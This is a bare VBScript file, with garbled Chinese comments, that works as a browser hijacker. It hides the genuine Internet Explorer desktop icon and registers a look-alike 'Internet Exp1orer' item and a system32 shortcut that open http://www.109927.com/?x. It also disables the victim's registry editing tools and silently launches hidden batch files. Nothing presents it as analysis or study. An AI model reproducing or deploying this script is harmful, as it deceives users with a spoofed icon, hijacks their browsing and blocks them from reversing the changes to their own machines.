Set WshShell = WScript.CreateObject("WScript.Shell")
strDesktop = WshShell.SpecialFolders("Desktop") :'�����ļ��С����桱
Favorites = WshShell.SpecialFolders("Favorites") :'�����ļ��С����桱
Rem 
RegPath="HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel\{871C5380-42A0-1069-A2EA-08002B30309D}"
RegPath1="HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\ClassicStartMenu\{871C5380-42A0-1069-A2EA-08002B30309D}"
Type_Name="REG_DWORD"
Key_Data=1
WshShell.RegWrite RegPath,Key_Data,Type_Name
WshShell.RegWrite RegPath1,Key_Data,Type_Name
Dim WSHShell, strDesktop 
WSHShell.AppActivate strDesktop 
WSHShell.SendKeys "{F5}"

strWinDir = WshShell.ExpandEnvironmentStrings("%ProgramFiles%")
ie=strWinDir&"\Internet Explorer\iexplore.exe"
winds = WshShell.ExpandEnvironmentStrings("%SystemRoot%")
WSHShell.regwrite "HKCR\CLSID\{E2BDE352-AB67-EF4B-8643-A56AE98F5733}\", "Internet Exp1orer"
WSHShell.regwrite "HKCR\CLSID\{E2BDE352-AB67-EF4B-8643-A56AE98F5733}\DefaultIcon\", ie
WSHShell.regwrite "HKCR\CLSID\{E2BDE352-AB67-EF4B-8643-A56AE98F5733}\Shell\",""
WSHShell.regwrite "HKCR\CLSID\{E2BDE352-AB67-EF4B-8643-A56AE98F5733}\Shell\D\", "ɾ��(&D)"
WSHShell.regwrite "HKCR\CLSID\{E2BDE352-AB67-EF4B-8643-A56AE98F5733}\Shell\D\Command\", "Rundll32.exe Shell32.dll,Control_RunDLL Inetcpl.cpl"
WSHShell.regwrite "HKCR\CLSID\{E2BDE352-AB67-EF4B-8643-A56AE98F5733}\Shell\Open\", "����ҳ"
WSHShell.regwrite "HKCR\CLSID\{E2BDE352-AB67-EF4B-8643-A56AE98F5733}\Shell\Open\Command\", ie&" http://www.109927.com/?x"
WSHShell.regwrite "HKCR\CLSID\{E2BDE352-AB67-EF4B-8643-A56AE98F5733}\Shell\����\", "����"
WSHShell.regwrite "HKCR\CLSID\{E2BDE352-AB67-EF4B-8643-A56AE98F5733}\Shell\����\Command\", "Rundll32.exe Shell32.dll,Control_RunDLL Inetcpl.cpl"
WSHShell.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Desktop\NameSpace\{E2BDE352-AB67-EF4B-8643-A56AE98F5733}""\", "Internet Explorer"
WSHShell.regwrite "HKCR\CLSID\{E2BDE352-AB67-EF4B-8643-A56AE98F5733}\ShellFolder\",""
WSHShell.regwrite "HKCR\CLSID\{E2BDE352-AB67-EF4B-8643-A56AE98F5733}\ShellFolder\Attributes",10,"REG_DWORD"
WSHShell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDesktopCleanupWizard",1,"REG_DWORD"
WSHShell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Group Policy Objects\{93DA0C80-839B-474D-BCA0-0F3FB983C5CC}User\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDesktopCleanupWizard",1,"REG_DWORD"
WSHShell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools",1,"REG_DWORD"


set oUrlLink = WshShell.CreateShortcut("C:\WINDOWS\system32\Internet Explorer.url") 
oUrlLink.TargetPath = "http://www.109927.com/?x"
oUrlLink.Save

Set wsws = CreateObject("Wscript.Shell")
Set wsws1 = CreateObject("Wscript.Shell")
Dim OperationRegistry 
Set OperationRegistry=WScript.CreateObject("WScript.Shell") 
Dim data1,a9
Data1=OperationRegistry.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page") 
a9=left(Data1,len("http://www.baidu.sina.qq.china.163.youku.gg.109927.com"))
a90=left(Data1,len("http://www.109927.com"))

if a9="http://www.baidu.sina.qq.china.163.youku.gg.109927.com" or a90="http://www.109927.com" then
else
wsws.run "cmd /c 1.bat",vbhide
end if

wsws1.run "cmd /c a.bat",vbhide
wsws1.run "cmd /c b.bat",vbhide